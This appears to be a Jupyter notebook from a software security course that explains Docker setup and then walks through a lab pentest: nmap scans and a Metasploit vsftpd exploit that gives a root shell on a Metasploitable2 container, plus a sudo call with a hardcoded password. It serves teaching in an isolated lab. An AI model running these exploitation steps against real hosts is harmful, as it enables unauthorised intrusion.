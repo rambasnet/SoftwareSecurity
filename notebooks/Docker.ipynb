{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "b36513a1-eca3-49f6-b328-c3183578d966",
   "metadata": {},
   "source": [
    "# Docker\n",
    "\n",
    "## Install Docker & Docker Compose\n",
    "- GitHub Codespaces already has docker and docker-compose installed and the docker daemon running\n",
    "- if you download and use SEED VM Ubuntu 20.04 from https://seedsecuritylabs.org/labs.html, you already have docker installed and configured\n",
    "- if you use your own Ubuntu/Kali, follow the instructions from the following link:\n",
    "     - https://www.kali.org/docs/containers/installing-docker-on-kali/#installing-docker-ce-on-kali-linux\n",
    "- `$ sudo apt install -y docker-compose`\n",
    "\n",
    "## Docker Documentations\n",
    "- Docker Manual from SEEDLabs\n",
    "- [https://github.com/seed-labs/seed-labs/blob/master/manuals/docker/SEEDManual-Container.md](https://github.com/seed-labs/seed-labs/blob/master/manuals/docker/SEEDManual-Container.md)\n",
    "- https://docs.docker.com/get-started/\n",
    "- https://docs.docker.com/manuals/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "87366d6d-1b2c-40b5-9763-17eb5a7fea7f",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Reading package lists... Done\n",
      "Building dependency tree... Done\n",
      "Reading state information... Done\n",
      "docker-compose is already the newest version (1.29.2-6).\n",
      "The following packages were automatically installed and are no longer required:\n",
      "  fonts-noto-color-emoji libabsl20220623 libaio1 libatk-adaptor libbabeltrace1\n",
      "  libboost-dev libboost1.83-dev libc6-dbg libdebuginfod-common libipt2\n",
      "  libnsl-dev libopenblas-dev libopenblas-pthread-dev libopenblas0\n",
      "  libpython3-all-dev libpython3.12-dev libsource-highlight-common\n",
      "  libsource-highlight4t64 libtirpc-dev libxsimd-dev python3-all-dev\n",
      "  python3-anyjson python3-beniget python3-gast python3-pyatspi python3-pypdf2\n",
      "  python3-pyppeteer python3-pyrsistent python3-pythran python3.12-dev xtl-dev\n",
      "Use 'sudo apt autoremove' to remove them.\n",
      "0 upgraded, 0 newly installed, 0 to remove and 1327 not upgraded.\n"
     ]
    }
   ],
   "source": [
    "! echo kali | sudo -S apt install -y docker-compose"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a0aa670b-ac4f-4390-a0ee-5980ecec44ad",
   "metadata": {},
   "source": [
    "## Important Docker Commands\n",
    "\n",
    "- `$ docker ps` # list all the containers running\n",
    "- `$ docker exec -it --rm <container-name/id> <bash command; e.g. /bin/bash>`\n",
    "- `$ docker image ls`\n",
    "- `$ docker image rm <image-id>`\n",
    "- `$ docker image prune`\n",
    "- `$ docker network ls`\n",
    "- `$ docker network rm <network-id>`\n",
    "- `$ docker network prune`\n",
    "- `$ docker container ls` # list all the continer running\n",
    "\n",
    "\n",
    "## Docker Compose\n",
    "- `$ docker-compose up -d` # start all services in the background\n",
    "- `$ docker-compose down`\n",
    "- `$ docker-compose logs`\n",
    "- `$ docker-compose exec <service-name> <bash command; e.g. /bin/bash>`\n",
    "- `$ docker-compose build`\n",
    "- `$ docker exec -it <container-id> zsh`\n",
    "\n",
    "## Steps to Start Docker Pentest network\n",
    "- change the working directory to `demos/pentest`\n",
    "- run the following commands\n",
    "\n",
    "- `$ docker-compose up -d`\n",
    "- `$ docker ps`\n",
    "- `$ docker exec -it <container-id> <zsh|bash>`\n",
    "\n",
    "## Quick Pentest\n",
    "- run namp on the metasploitable target/victim\n",
    "\n",
    "- `$ nmap`\n",
    "- `$ nmap 192.168.10.200`\n",
    "- `$ nmap -sV -p 21 192.168.10.200`\n",
    "- `$ msfconsole`\n",
    "- `msf6 > search vsftpd`\n",
    "- `msf6 > use 1`\n",
    "- `msf6 > show options`\n",
    "- `msf6 > set rhost 192.168.10.200`\n",
    "- `msf6 > set rport 21`\n",
    "- `msf6 > show option`\n",
    "- `msf6 > exploit`\n",
    "\n",
    "- should pawn the target...\n",
    "- you'll get a root shell to metasploitable2 that you can interact with!\n",
    "- you don't get a prompt; just type bash commands\n",
    "- `whomai`\n",
    "- `uname -a`\n",
    "- `touch iwashere`\n",
    "\n",
    "- get the interactive shell to metasploitable2 and see the file created...\n",
    "- `docker exec -it metasploitable2 bash`\n",
    "- `# ls`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "41eda7b3",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
